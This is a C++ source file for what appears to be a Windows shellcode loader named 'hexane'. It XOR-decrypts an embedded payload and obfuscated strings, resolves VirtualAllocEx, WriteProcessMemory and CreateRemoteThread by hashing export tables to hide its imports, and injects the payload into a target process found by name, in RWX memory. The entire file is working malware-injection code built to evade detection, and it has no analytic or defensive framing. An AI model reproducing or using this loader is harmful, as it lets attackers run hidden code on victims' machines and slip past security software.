#include <Windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <winternl.h>
#include <stdio.h>

#include "resource.h"
#include "multitool.h"
#include "test.h"

using OpenProcess_t = HANDLE(WINAPI*) (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
using VirtualAllocEx_t = LPVOID(WINAPI*) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
using WriteProcessMemory_t = BOOL(WINAPI*) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
using CreateRemoteThread_t = HANDLE(WINAPI*) (HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

DWORD __GetProcessId(VOID)
{
	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE) { return 0; }
	XorCipher(strings_processName, strings_namelen, strings_key, strings_keylen);

	if (Process32First(hSnapshot, &processEntryList) == true) {
		while (Process32Next(hSnapshot, &processEntryList) == true) {
			if (strcmp((CONST CHAR*)strings_processName, processEntryList.szExeFile) == 0) {

				return processEntryList.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(hSnapshot);
}

template <typename mutableType>
inline mutableType LookupRVA(LPVOID Base, LONG Rva)
{
	return (mutableType)((ULONG_PTR)Base + Rva);
}

FARPROC __GetProcAddress(HMODULE dllBase, DWORD funcHash)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + (dosHeader)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosHeader + (ntHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (imageExportDirectory->AddressOfNames != NULL)
	{
		PWORD addressOfOrdinalsRVA = LookupRVA<PWORD>(dllBase, imageExportDirectory->AddressOfNameOrdinals);
		PDWORD addressOfNamesRVA = LookupRVA<PDWORD>(dllBase, imageExportDirectory->AddressOfNames);
		PDWORD addressOfFunctions = LookupRVA<PDWORD>(dllBase, imageExportDirectory->AddressOfFunctions);

		for (DWORD i = 0; i < imageExportDirectory->NumberOfNames; i++)
		{
			LPSTR name_pointer = LookupRVA<LPSTR>(dllBase, addressOfNamesRVA[i]);
			if (GetHashFromString((UCHAR*)name_pointer) == funcHash)
			{
				PBYTE function = LookupRVA<PBYTE>(dllBase, addressOfFunctions[addressOfOrdinalsRVA[i]]);
				return (FARPROC)function;
			}
		}
	}
}

template <typename mutableType>
inline mutableType CallConstructor(UCHAR* FunctionString, CONST INT FunctionStringLength)
{
	mutableType __FunctionHandle = NULL;
	XorCipher(FunctionString, FunctionStringLength, strings_key, strings_keylen);

	DWORD returned_string = GetHashFromString(FunctionString);
	HMODULE dllBase = LoadLibraryA((LPCSTR)strings_kern32);

	__FunctionHandle = (mutableType)__GetProcAddress(dllBase, returned_string);

	memset(FunctionString, 0, FunctionStringLength);
	FreeLibrary(dllBase);

	return __FunctionHandle;
}

VOID PayloadInjection(VOID)
{
	DWORD pid = __GetProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	VirtualAllocEx_t __VirtualAllocEx = CallConstructor<VirtualAllocEx_t>(strings_VirtualAllocEx, vaxLength);
	LPVOID lpBaseAddress = __VirtualAllocEx(hProcess, NULL, payload_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	XorCipher(payload, payload_length, payload_key, payload_keylength);

	WriteProcessMemory_t __WriteProcessMemory = CallConstructor<WriteProcessMemory_t>(strings_WriteProcessMemory, wpmLength);
	__WriteProcessMemory(hProcess, lpBaseAddress, payload, sizeof(payload), NULL);

	CreateRemoteThread_t __CreateRemoteThread = CallConstructor<CreateRemoteThread_t>(strings_CreateRemoteThread, crtLength);
	HANDLE threadHandle = __CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);

	CloseHandle(hProcess);
}

int main(void)
{
	HWND hWindow = GetConsoleWindow();
	ShowWindow(hWindow, SW_SHOW);

	//__alt_sleepms(SLEEPTIME * 5);

	PayloadInjection();
	return 0;
}

// g++.exe "C:\Users\lemur\Visual Studio\hexane\hexane\hexane-final.cpp" -o "C:\Users\lemur\Visual Studio\hexane\x64\Release\hexane.exe" -s -lwininet -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc //
